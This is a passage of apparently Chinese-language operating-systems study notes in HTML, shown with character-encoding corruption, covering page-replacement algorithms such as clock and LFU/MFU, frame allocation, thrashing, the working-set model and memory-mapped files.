ç¬¦å·æ•´æ•°ï¼Œé‚£ä¹ˆå…·æœ‰æœ€å°å€¼çš„é¡µä¸ºLRUé¡µï¼Œä¸”å¯ä»¥è¢«ç½®æ¢ã€‚</p></li><li><p><strong>äºŒæ¬¡æœºä¼šç®—æ³•</strong></p><p>äºŒæ¬¡æœºä¼šç½®æ¢çš„åŸºæœ¬ç®—æ³•æ˜¯ FIFO ç½®æ¢ç®—æ³•ã€‚ å½“è¦é€‰æ‹©ä¸€ä¸ªé¡µæ—¶ï¼Œæ£€æŸ¥å…¶å¼•ç”¨ä½ã€‚å¦‚æœå…¶å€¼ä¸º0ï¼Œé‚£ä¹ˆå°±ç›´æ¥ç½®æ¢è¯¥é¡µã€‚å¦‚æœå¼•ç”¨ä½ä¸º1ï¼Œé‚£ä¹ˆå°±ç»™è¯¥é¡µç¬¬äºŒæ¬¡æœºä¼šï¼Œå¹¶é€‰æ‹©ä¸‹ä¸€ä¸ªFIFO é¡µã€‚å½“ä¸€ä¸ªé¡µè·å¾—ç¬¬äºŒæ¬¡æœºä¼šæ—¶ï¼Œå…¶å¼•ç”¨ä½æ¸…é›¶ï¼Œä¸”å…¶åˆ°è¾¾æ—¶é—´è®¾ä¸ºå½“å‰æ—¶é—´ã€‚å› æ­¤ï¼Œè·å¾—ç¬¬äºŒæ¬¡æœºä¼šçš„é¡µåœ¨æ‰€æœ‰å…¶ä»–é¡µç½®æ¢ï¼ˆæˆ–è·å¾—ç¬¬äºŒæ¬¡æœºä¼šï¼‰ä¹‹å‰ï¼Œæ˜¯ä¸ä¼šè¢«ç½®æ¢çš„ã€‚ å¦å¤–ï¼Œå¦‚æœä¸€ ä¸ªé¡µç»å¸¸ä½¿ç”¨ä»¥è‡´å…¶å¼•ç”¨ä½æ€»æ˜¯è¢«è®¾ç½®ï¼Œ é‚£ä¹ˆå®ƒå°±ä¸ä¼šè¢«ç½®æ¢ã€‚</p><p>ä¸€ç§å®ç°äºŒæ¬¡æœºä¼šç®—æ³•ï¼ˆæœ‰æ—¶ç§°ä¸º<strong>æ—¶é’Ÿç®—æ³•</strong>ï¼‰çš„æ–¹æ³•æ˜¯é‡‡ç”¨å¾ªç¯é˜Ÿåˆ—ã€‚ ç”¨ä¸€ä¸ªæŒ‡é’ˆè¡¨ç¤ºä¸‹æ¬¡è¦ç½®æ¢å“ªä¸€é¡µã€‚ å½“éœ€è¦ä¸€ä¸ªå¸§æ—¶ï¼ŒæŒ‡é’ˆå‘å‰ç§»åŠ¨ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå¼•ç”¨ä½ä¸º0çš„é¡µã€‚åœ¨å‘å‰ç§»åŠ¨æ—¶ï¼Œå®ƒå°†æ¸…é™¤å¼•ç”¨ä½ï¼ˆè§å›¾ 9.17ï¼‰ã€‚ä¸€æ—¦æ‰¾åˆ°ç‰ºç‰²é¡µï¼Œå°±ç½®æ¢è¯¥é¡µï¼Œæ–°é¡µå°±æ’å…¥åˆ°å¾ªç¯é˜Ÿåˆ—çš„è¯¥ä½ç½®ã€‚æ³¨æ„ï¼šåœ¨æœ€åæƒ…å†µä¸‹ï¼Œæ‰€æœ‰ä½å‡å·±è®¾ç½®ï¼ŒæŒ‡é’ˆä¼šéå†æ•´ä¸ªå¾ªç¯é˜Ÿåˆ—ï¼Œä»¥ä¾¿ç»™æ¯ä¸ªé¡µç¬¬äºŒæ¬¡æœºä¼šã€‚ å®ƒå°†æ¸…é™¤æ‰€æœ‰å¼•ç”¨ä½åå†é€‰æ‹©é¡µæ¥ç½®æ¢ã€‚ è¿™æ ·ï¼Œå¦‚æœæ‰€æœ‰ä½å‡å·²è®¾ç½®ï¼Œé‚£ä¹ˆäºŒæ¬¡æœºä¼šç½®æ¢å°±å˜æˆäº†FIFO ç½®æ¢ã€‚</p><p><img src="/posts/8ce3e425/image-20220103144540004.png" alt="image-20220103144540004"></p></li><li><p><strong>å¢å¼ºå‹äºŒæ¬¡æœºä¼šç®—æ³•</strong><br>é€šè¿‡å°†å¼•ç”¨ä½å’Œä¿®æ”¹ä½ï¼ˆå°†åœ¨ 9.4.1 å°èŠ‚ä¸­ä»‹ç»ã€‰ä½œä¸ºä¸€æœ‰åºå¯¹æ¥è€ƒè™‘ï¼Œå¯ä»¥æ”¹è¿›äºŒæ¬¡æœºä¼šç®—æ³•ã€‚ é‡‡ç”¨è¿™ä¸¤ä¸ªä½ï¼Œæœ‰ä¸‹é¢å››ç§å¯èƒ½ç±»å‹ï¼š<br>â‘ ï¼ˆ0, 0ï¼‰æœ€è¿‘æ²¡æœ‰ä½¿ç”¨ä¸”ä¹Ÿæ²¡æœ‰ä¿®æ”¹ä¸€ä¸€ ç”¨äºç½®æ¢çš„æœ€ä½³é¡µã€‚</p><p>â‘¡ï¼ˆ0, 1ï¼‰æœ€è¿‘æ²¡æœ‰ä½¿ç”¨ ä½†ä¿®æ”¹è¿‡ä¸€ä¸€ä¸æ˜¯å¾ˆå¥½ï¼Œå› ä¸ºåœ¨ç½®æ¢ä¹‹å‰éœ€è¦å°†é¡µå†™å‡ºåˆ°ç£ç›˜ã€‚</p><p>â‘¢ (1, 0ï¼‰æœ€è¿‘ä½¿ç”¨è¿‡ä½†æ²¡æœ‰ä¿®æ”¹ä¸€ä¸€å®ƒæœ‰å¯èƒ½å¾ˆå¿«åˆè¦è¢«ä½¿ç”¨ã€‚</p><p>â‘£ï¼ˆ1, 1ï¼‰æœ€è¿‘ä½¿ç”¨è¿‡ä¸”ä¿®æ”¹è¿‡ä¸€ä¸€å®ƒæœ‰å¯èƒ½å¾ˆå¿«åˆè¦è¢«ä½¿ç”¨ï¼Œ ä¸”ç½®æ¢ä¹‹å‰éœ€è¦å°†é¡µå†™å‡ºåˆ°ç£ç›˜ã€‚</p></li></ol><h3 id="946-åŸºäºè®¡æ•°çš„é¡µç½®æ¢"><a class="markdownIt-Anchor" href="#946-åŸºäºè®¡æ•°çš„é¡µç½®æ¢"></a> 9.4.6 åŸºäºè®¡æ•°çš„é¡µç½®æ¢</h3><p>è¿˜æœ‰è®¸å¤šå…¶ä»–ç®—æ³•å¯ç”¨äºé¡µç½®æ¢ã€‚ ä¾‹å¦‚ï¼Œ å¯ä»¥ä¸ºæ¯ä¸ªé¡µä¿ç•™ä¸€ä¸ªç”¨äºè®°å½•å…¶å¼•ç”¨æ¬¡æ•°çš„è®¡æ•°å™¨ï¼Œ å¹¶å¯å½¢æˆå¦‚ä¸‹ä¸¤ä¸ªæ–¹æ¡ˆã€‚</p><ul><li><p><strong>æœ€ä¸ç»å¸¸ä½¿ç”¨é¡µç½®æ¢ç®—æ³•</strong>ï¼ˆ least frequently used (<strong>LFU</strong>) page-replacement algorithmï¼‰è¦æ±‚ç½®æ¢è®¡æ•°æœ€å°çš„é¡µã€‚ è¿™ç§é€‰æ‹©çš„ç†ç”±æ˜¯æ´»åŠ¨é¡µåº”è¯¥æœ‰æ›´å¤§çš„å¼•ç”¨æ¬¡æ•°ã€‚ è¿™ç§ç®—æ³•ä¼šäº§ç”Ÿå¦‚ä¸‹é—®é¢˜ï¼š ä¸€ä¸ªé¡µåœ¨è¿›ç¨‹å¼€å§‹æ—¶ä½¿ç”¨å¾ˆå¤šï¼Œ ä½†ä»¥åå°±ä¸å†ä½¿ç”¨ã€‚ ç”±äºå…¶ä½¿ç”¨è¿‡å¾ˆå¤šï¼Œ æ‰€ä»¥å®ƒæœ‰è¾ƒå¤§æ¬¡æ•°ï¼Œ æ‰€ä»¥å³ä½¿ä¸å†ä½¿ç”¨ä»ç„¶ä¼šåœ¨å†…å­˜ä¸­ã€‚ è§£å†³æ–¹æ³•ä¹‹ä¸€æ˜¯å®šæœŸåœ°å°†æ¬¡æ•°å¯„å­˜å™¨å³ç§»ä¸€ä½ï¼Œ ä»¥å½¢æˆæŒ‡æ•°è¡°å‡çš„å¹³å‡ä½¿ç”¨æ¬¡æ•°ã€‚</p></li><li><p><strong>æœ€å¸¸ä½¿ç”¨é¡µç½®æ¢ç®—æ³•</strong>ï¼ˆ most frequently used (<strong>MFU</strong>) page-replacement algorithmï¼‰ æ˜¯åŸºäºå¦‚ä¸‹ç†è®ºï¼š å…·æœ‰æœ€å°æ¬¡æ•°çš„é¡µå¯èƒ½åˆšåˆšè°ƒè¿›æ¥ï¼Œ ä¸”è¿˜æ²¡æœ‰ä½¿ç”¨ã€‚å¯ä»¥æƒ³è±¡ï¼ŒMFU å’Œ LFU ç½®æ¢éƒ½ä¸å¸¸ç”¨ã€‚ è¿™ä¸¤ç§ç®—æ³•çš„å®ç°éƒ½å¾ˆè´¹æ—¶ï¼Œ ä¸”å¹¶ä¸èƒ½å¾ˆå¥½åœ°è¿‘ä¼¼OPTç½®æ¢ç®—æ³•ã€‚</p></li></ul><h3 id="947-é¡µç¼“å†²ç®—æ³•"><a class="markdownIt-Anchor" href="#947-é¡µç¼“å†²ç®—æ³•"></a> 9.4.7 é¡µç¼“å†²ç®—æ³•</h3><p>é™¤äº†ç‰¹å®šé¡µç½®æ¢ç®—æ³•å¤–ï¼Œ è¿˜ç»å¸¸é‡‡ç”¨å…¶ä»–æªæ–½ã€‚ ä¾‹å¦‚ï¼Œç³»ç»Ÿé€šå¸¸ä¿ç•™ä¸€ä¸ªç©ºé—²å¸§ç¼“å†²æ± ã€‚ å½“å‡ºç°é¡µé”™è¯¯æ—¶ï¼Œ ä¼šåƒä»¥å‰ä¸€æ ·é€‰æ‹©ä¸€ä¸ªç‰ºç‰²å¸§ã€‚ ç„¶è€Œï¼Œ åœ¨ç‰ºç‰²å¸§å†™å‡ºä¹‹å‰ï¼Œæ‰€éœ€è¦çš„é¡µå°±ä»ç¼“å†²æ± ä¸­è¯»åˆ°ç©ºé—²å†…å­˜ã€‚ è¿™ç§æ–¹æ³•å…è®¸è¿›ç¨‹å°½å¯èƒ½å¿«åœ°é‡å¯ï¼Œè€Œæ— é¡»ç­‰å¾…ç‰ºç‰²å¸§é¡µçš„å†™å‡ºã€‚ å½“åœ¨ç‰ºç‰²å¸§ä»¥åå†™å‡ºæ—¶ï¼Œ å®ƒå†åŠ å…¥åˆ°ç©ºé—²å¸§æ± ã€‚</p><p>å¦ ä¸€ç§ä¿®æ”¹æ˜¯ä¿ç•™ä¸€ä¸ªç©ºé—²å¸§æ± ï¼Œ ä½†è¦è®°ä½å“ªäº›é¡µåœ¨å“ªäº›å¸§ä¸­ã€‚ ç”±äºå½“å¸§å†™åˆ°ç£ç›˜ä¸Šæ—¶å…¶å†…å®¹å¹¶æ²¡æœ‰ä¿®æ”¹ï¼Œ æ‰€ä»¥åœ¨è¯¥å¸§è¢«é‡ç”¨ä¹‹å‰å¦‚æœéœ€è¦ä½¿ç”¨åŸæ¥é¡µï¼Œ é‚£ä¹ˆåŸæ¥é¡µå¯ç›´æ¥ä»ç©ºé—²å¸§æ± ä¸­å–å‡ºæ¥ä½¿ç”¨ã€‚ è¿™æ—¶å¹¶ä¸éœ€è¦1/0ã€‚ å½“ä¸€ä¸ªé¡µé”™è¯¯å‘ç”Ÿæ—¶ï¼Œ å…ˆæ£€æŸ¥æ‰€éœ€è¦é¡µæ˜¯å¦åœ¨ç©ºé—²å¸§æ± ä¸­ã€‚ å¦‚æœä¸åœ¨ï¼Œ é‚£ä¹ˆæ‰å¿…é¡»é€‰æ‹©ä¸€ä¸ªç©ºé—²å¸§æ¥è¯»å…¥æ‰€éœ€é¡µã€‚</p><h2 id="95-å¸§åˆ†é…"><a class="markdownIt-Anchor" href="#95-å¸§åˆ†é…"></a> 9.5 å¸§åˆ†é…</h2><h3 id="951-å¸§çš„æœ€å°‘æ•°é‡"><a class="markdownIt-Anchor" href="#951-å¸§çš„æœ€å°‘æ•°é‡"></a> 9.5.1 å¸§çš„æœ€å°‘æ•°é‡</h3><p>æ¯ä¸ªè¿›ç¨‹å¸§çš„æœ€å°‘æ•°é‡æ˜¯ç”±ä½“ç³»ç»“æ„å†³å®šçš„ï¼Œè€Œæœ€å¤§æ•°é‡æ˜¯ç”±å¯ç”¨ç‰©ç†å†…å­˜çš„æ•°é‡æ¥å†³å®šã€‚åœ¨è¿™ä¸¤è€…ä¹‹é—´ï¼Œå…³äºå¸§åˆ†é…è¿˜æ˜¯æœ‰å¾ˆå¤šé€‰æ‹©çš„ã€‚</p><h3 id="952-åˆ†é…ç®—æ³•"><a class="markdownIt-Anchor" href="#952-åˆ†é…ç®—æ³•"></a> 9.5.2 åˆ†é…ç®—æ³•</h3><p><strong>å¹³å‡åˆ†é…</strong></p><p>åœ¨nä¸ªè¿›ç¨‹ä¹‹é—´åˆ†é… mä¸ªå¸§çš„æœ€ä¸ºå®¹æ˜“çš„æ–¹æ³•æ˜¯ç»™æ¯ä¸ªä¸€ä¸ªå¹³å‡å€¼ï¼Œå³ m/n å¸§</p><p><strong>æ¯”ä¾‹åˆ†é…</strong></p><p>æ ¹æ®è¿›ç¨‹å¤§å°ï¼Œè€Œå°†å¯ç”¨å†…å­˜åˆ†é…ç»™æ¯ä¸ªè¿›ç¨‹ã€‚è®¾è¿›ç¨‹ Ptçš„è™šæ‹Ÿå†…å­˜å¤§å°ä¸ºS<sub>i</sub>ä¸”å®šä¹‰</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>=</mo><mo>âˆ‘</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S=\sum s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">âˆ‘</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>è¿™æ ·ï¼Œ å¦‚æœå¯ç”¨å¸§çš„æ€»æ•°ä¸ºmï¼Œé‚£ä¹ˆè¿›ç¨‹ P<sub>i</sub> å¯åˆ†é…åˆ° a~iä¸ªå¸§ï¼Œ è¿™é‡Œaï¼›è¿‘ä¼¼ä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>=</mo><msub><mi>s</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><mi>S</mi><mo>Ã—</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">a_i=s_i/SÃ—m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span></span></p><h3 id="953-å…¨å±€åˆ†é…ä¸å±€éƒ¨åˆ†é…"><a class="markdownIt-Anchor" href="#953-å…¨å±€åˆ†é…ä¸å±€éƒ¨åˆ†é…"></a> 9.5.3 å…¨å±€åˆ†é…ä¸å±€éƒ¨åˆ†é…</h3><p>å„ä¸ªè¿›ç¨‹åˆ†é…å¸§çš„å¦ ä¸€ä¸ªé‡è¦å› ç´ æ˜¯é¡µç½®æ¢ã€‚ å½“æœ‰å¤šä¸ªè¿›ç¨‹ç«äº‰å¸§æ—¶ï¼Œ å¯å°†é¡µç½®æ¢ç®—æ³•åˆ†ä¸ºä¸¤å¤§ç±»ï¼š <strong>å…¨å±€ç½®æ¢</strong>ï¼ˆglobal replacementï¼‰å’Œ<strong>å±€éƒ¨ç½®æ¢</strong>ï¼ˆlocal replacementï¼‰ã€‚</p><ul><li><strong>å…¨å±€ç½®æ¢</strong>å…è®¸ä¸€ä¸ªè¿›ç¨‹ä»æ‰€æœ‰å¸§é›†åˆä¸­é€‰æ‹©ä¸€ä¸ªç½®æ¢å¸§ï¼Œ è€Œä¸ç®¡è¯¥å¸§æ˜¯å¦å·²åˆ†é…ç»™å…¶ä»–è¿›ç¨‹ï¼Œ å³ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ä»å¦ä¸€ä¸ªè¿›ç¨‹ä¸­æ‹¿åˆ°å¸§ã€‚</li><li><strong>å±€éƒ¨ç½®æ¢</strong>è¦æ±‚æ¯ä¸ªè¿›ç¨‹ä»…ä»å…¶è‡ªå·±çš„åˆ†é…å¸§ä¸­è¿›è¡Œé€‰æ‹©ã€‚</li></ul><p>å±€éƒ¨ç½®æ¢ä¸èƒ½ä½¿ç”¨å…¶ä»–è¿›ç¨‹çš„ä¸å¸¸ç”¨çš„å†…å­˜ï¼Œ æ‰€ä»¥ä¼šé˜»ç¢ä¸€ä¸ªè¿›<br>ç¨‹ã€‚å› æ­¤ï¼Œ å…¨å±€ç½®æ¢é€šå¸¸ä¼šæœ‰æ›´å¥½çš„ç³»ç»Ÿååé‡ï¼Œ ä¸”æ›´ä¸ºå¸¸ç”¨ã€‚</p><h2 id="96-ç³»ç»Ÿé¢ ç°¸"><a class="markdownIt-Anchor" href="#96-ç³»ç»Ÿé¢ ç°¸"></a> 9.6 ç³»ç»Ÿé¢ ç°¸</h2><p>é¢‘ç¹çš„é¡µè°ƒåº¦è¡Œä¸ºç§°ä¸ºé¢ ç°¸ï¼ˆthrashingï¼‰ã€‚å¦‚æœä¸€ä¸ªè¿›ç¨‹åœ¨æ¢é¡µä¸Šç”¨çš„æ—¶é—´è¦å¤šäºæ‰§è¡Œæ—¶é—´ï¼Œ é‚£ä¹ˆè¿™ä¸ªè¿›ç¨‹å°±åœ¨é¢ ç°¸ã€‚</p><h3 id="961-ç³»ç»Ÿé¢ ç°¸çš„åŸå› "><a class="markdownIt-Anchor" href="#961-ç³»ç»Ÿé¢ ç°¸çš„åŸå› "></a> 9.6.1 ç³»ç»Ÿé¢ ç°¸çš„åŸå› </h3><p>æ“ä½œç³»ç»Ÿåœ¨ç›‘è§†CPUçš„ä½¿ç”¨ç‡ã€‚ å¦‚æœCPUä½¿ç”¨ç‡å¤ªä½ï¼Œ é‚£ä¹ˆå‘ç³»ç»Ÿä¸­å¼•å…¥æ–°è¿›ç¨‹ï¼Œä»¥å¢åŠ å¤šé“ç¨‹åºçš„ç¨‹åº¦ã€‚é‡‡ç”¨å…¨å±€ç½®æ¢ç®—æ³•ï¼Œå®ƒä¼šç½®æ¢é¡µè€Œä¸ç®¡è¿™äº›é¡µæ˜¯å±äºå“ªä¸ªè¿›ç¨‹çš„ã€‚ç°åœ¨å‡è®¾ä¸€ä¸ªè¿›ç¨‹è¿›å…¥ä¸€ä¸ªæ–°æ‰§è¡Œé˜¶æ®µï¼Œ éœ€è¦æ›´å¤šçš„å¸§ã€‚ å®ƒå¼€å§‹å‡ºç°é¡µé”™è¯¯ï¼Œ å¹¶ä»å…¶ä»–è¿›ç¨‹ä¸­æ‹¿åˆ°å¸§ã€‚ ç„¶è€Œï¼Œ è¿™äº›è¿›ç¨‹ä¹Ÿéœ€è¦è¿™äº›é¡µï¼Œ æ‰€ä»¥å®ƒä»¬ä¹Ÿä¼šå‡ºç°é¡µé”™è¯¯ï¼Œ ä»è€Œä»å…¶ä»–è¿›ç¨‹ä¸­æ‹¿åˆ°å¸§ã€‚ è¿™äº›é¡µé”™è¯¯è¿›ç¨‹å¿…é¡»ä½¿ç”¨è°ƒé¡µè®¾å¤‡ä»¥æ¢è¿›å’Œæ¢å‡ºé¡µã€‚ éšç€å®ƒä»¬æ’é˜Ÿç­‰å¾…æ¢é¡µè®¾å¤‡ï¼Œ å°±ç»ªé˜Ÿåˆ—ä¼šå˜ç©ºï¼Œ è€Œè¿›ç¨‹ç­‰å¾…è°ƒé¡µè®¾å¤‡ï¼ŒCPUä½¿ç”¨ç‡å°±ä¼šé™ä½ã€‚</p><p>CPUè°ƒåº¦ç¨‹åºå‘ç°CPUä½¿ç”¨ç‡é™ä½ï¼Œå› æ­¤ä¼šå¢åŠ å¤šé“ç¨‹åºçš„ç¨‹åº¦ã€‚ æ–°è¿›ç¨‹è¯•å›¾ä»å…¶ä»–è¿è¡Œè¿›ç¨‹ä¸­æ‹¿åˆ°å¸§ï¼Œä»è€Œå¼•èµ·æ›´å¤šé¡µé”™è¯¯ï¼Œ å½¢æˆæ›´é•¿çš„è°ƒé¡µè®¾å¤‡çš„é˜Ÿåˆ—ã€‚ å› æ­¤ï¼ŒCPUä½¿ç”¨ç‡è¿›ä¸€æ­¥é™ä½ï¼ŒCPUè°ƒåº¦ç¨‹åºè¯•å›¾å†å¢åŠ å¤šé“ç¨‹åºçš„ç¨‹åº¦ã€‚ è¿™æ ·å°±å‡ºç°äº†ç³»ç»Ÿé¢ ç°¸ï¼Œ ç³»ç»Ÿååé‡é™¡é™ï¼Œ é¡µé”™è¯¯æ˜¾è‘—å¢åŠ ã€‚ å› æ­¤ï¼Œ æœ‰æ•ˆå†…å­˜è®¿é—®æ—¶é—´å¢åŠ ã€‚ æœ€ç»ˆå› ä¸ºè¿›ç¨‹ä¸»è¦å¿™äºè°ƒé¡µï¼Œ ç³»ç»Ÿä¸èƒ½å®Œæˆä¸€ä»¶å·¥ä½œã€‚</p><p><img src="/posts/8ce3e425/image-20220103150630462.png" alt="image-20220103150630462"></p><h3 id="962-å·¥ä½œé›†åˆæ¨¡å‹"><a class="markdownIt-Anchor" href="#962-å·¥ä½œé›†åˆæ¨¡å‹"></a> 9.6.2 å·¥ä½œé›†åˆæ¨¡å‹</h3><p>å·¥ä½œé›†åˆæ¨¡å‹ï¼ˆworking-set model) æ˜¯åŸºäºå±€éƒ¨æ€§å‡è®¾çš„ã€‚è¯¥æ¨¡å‹ä½¿ç”¨å‚æ•°<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Î”</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Î”</span></span></span></span> å®šä¹‰å·¥ä½œé›†åˆçª—å£ï¼ˆworking-set windowï¼‰ã€‚å…¶æ€æƒ³æ˜¯æ£€æŸ¥æœ€è¿‘<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Î”</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Î”</span></span></span></span>ä¸ªé¡µçš„å¼•ç”¨ã€‚ è¿™æœ€è¿‘<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Î”</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Î”</span></span></span></span>ä¸ªå¼•ç”¨çš„é¡µé›†åˆç§°ä¸ºå·¥ä½œé›†åˆï¼ˆworking set) ï¼ˆå¦‚å›¾ 9.20 æ‰€ç¤ºï¼‰ã€‚å¦‚æœä¸€ä¸ªé¡µæ­£åœ¨ä½¿ç”¨ä¸­ï¼Œ<br>é‚£ä¹ˆå®ƒå°±åœ¨å·¥ä½œé›†åˆå†…ã€‚å¦‚æœå®ƒä¸å†ä½¿ç”¨ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨å…¶ä¸Šæ¬¡å¼•ç”¨çš„Aæ—¶é—´å•ä½åä»å·¥ä½œé›†åˆä¸­åˆ é™¤ã€‚ å› æ­¤ï¼Œå·¥ä½œé›†åˆæ˜¯ç¨‹åºå±€éƒ¨çš„è¿‘ä¼¼ã€‚</p><p><img src="/posts/8ce3e425/image-20220103184407266.png" alt="image-20220103184407266"></p><h3 id="963-é¡µé”™è¯¯é¢‘ç‡"><a class="markdownIt-Anchor" href="#963-é¡µé”™è¯¯é¢‘ç‡"></a> 9.6.3 é¡µé”™è¯¯é¢‘ç‡</h3><p>é¢ ç°¸å…·æœ‰é«˜çš„é¡µé”™è¯¯ç‡ã€‚å› æ­¤ï¼Œéœ€è¦æ§åˆ¶é¡µé”™è¯¯ç‡ã€‚å½“é¡µé”™è¯¯ç‡å¤ªé«˜æ—¶ï¼Œ è¿›ç¨‹éœ€è¦æ›´å¤šå¸§ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœé¡µé”™è¯¯ç‡å¤ªä½ï¼Œé‚£ä¹ˆè¿›ç¨‹å¯èƒ½æœ‰å¤ªå¤šçš„å¸§ã€‚ å¯ä»¥ä¸ºæ‰€æœŸæœ›çš„é¡µé”™è¯¯ç‡è®¾ç½®ä¸Šé™å’Œä¸‹é™ï¼ˆè§å›¾ 9.21 ï¼‰ã€‚ å¦‚æœå®é™…é¡µé”™è¯¯ç‡è¶…è¿‡ä¸Šé™ï¼Œé‚£ä¹ˆä¸ºè¿›ç¨‹åˆ†é…æ›´å¤šçš„å¸§ï¼šå¦‚æœå®é™…é¡µé”™è¯¯ç‡ä½äºä¸‹é™ï¼Œé‚£ä¹ˆå¯ä»è¯¥è¿›ç¨‹ä¸­ç§»èµ°å¸§ã€‚å› æ­¤ï¼Œå¯ä»¥ç›´æ¥æµ‹é‡ å’Œæ§åˆ¶é¡µé”™è¯¯ç‡ä»¥é˜²æ­¢é¢ ç°¸ã€‚ä¸å·¥ä½œé›†åˆç­–ç•¥ä¸€æ ·ï¼Œ ä¹Ÿå¯èƒ½å¿…é¡»æš‚åœä¸€ä¸ªè¿›ç¨‹ã€‚ å¦‚æœé¡µé”™è¯¯å¢åŠ ä¸”æ²¡æœ‰å¯ç”¨å¸§ï¼Œ é‚£ä¹ˆå¿…é¡»é€‰æ‹©ä¸€ä¸ªè¿›ç¨‹æš‚åœã€‚ æ¥ç€ï¼Œ å¯å°†é‡Šæ”¾çš„å¸§åˆ†é…ç»™é‚£äº›å…·æœ‰é«˜é¡µé”™è¯¯ç‡çš„è¿›ç¨‹ã€‚</p><h2 id="97-å†…å­˜æ˜ å°„æ–‡ä»¶"><a class="markdownIt-Anchor" href="#97-å†…å­˜æ˜ å°„æ–‡ä»¶"></a> 9.7 å†…å­˜æ˜ å°„æ–‡ä»¶</h2><h3 id="971-åŸºæœ¬æœºåˆ¶"><a class="markdownIt-Anchor" href="#971-åŸºæœ¬æœºåˆ¶"></a> 9.7.1 åŸºæœ¬æœºåˆ¶</h3><p>æ–‡ä»¶çš„å†…å­˜æ˜ å°„å¯å°†ä¸€ç£ç›˜å—æ˜ å°„æˆå†…å­˜çš„ä¸€é¡µï¼ˆæˆ–å¤šé¡µï¼‰ã€‚ å¼€å§‹çš„æ–‡ä»¶è®¿é—®æŒ‰æ™®é€šè¯·æ±‚é¡µé¢è°ƒåº¦æ¥è¿›è¡Œï¼Œ ä¼šäº§ç”Ÿé¡µé”™è¯¯ã€‚è¿™æ ·ï¼Œ ä¸€é¡µå¤§å°çš„éƒ¨åˆ†æ–‡ä»¶ä»æ–‡ä»¶ç³»ç»Ÿè¯»å…¥ç‰©ç†é¡µï¼ˆæœ‰çš„ç³»ç»Ÿä¼šä¸€æ¬¡è¯»å…¥å¤šä¸ªä¸€é¡µå¤§å°çš„å†…å®¹ã€‰ã€‚ä»¥åæ–‡ä»¶çš„è¯»å†™å°±æŒ‰é€šå¸¸çš„å†…å­˜è®¿é—®æ¥å¤„ç†ï¼Œç”±äºæ˜¯é€šè¿‡å†…å­˜æ“ä½œæ–‡ä»¶è€Œä¸æ˜¯ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ read()å’Œ write()ï¼Œ ä»è€Œç®€åŒ–äº†æ–‡ä»¶è®¿é—®å’Œä½¿ç”¨ã€‚</p><p><img src="/posts/8ce3e425/image-20220103194041972.png" alt="image-20220103194041972"></p><h3 id="972-win32-apiä¸­çš„å…±äº«å†…å­˜"><a 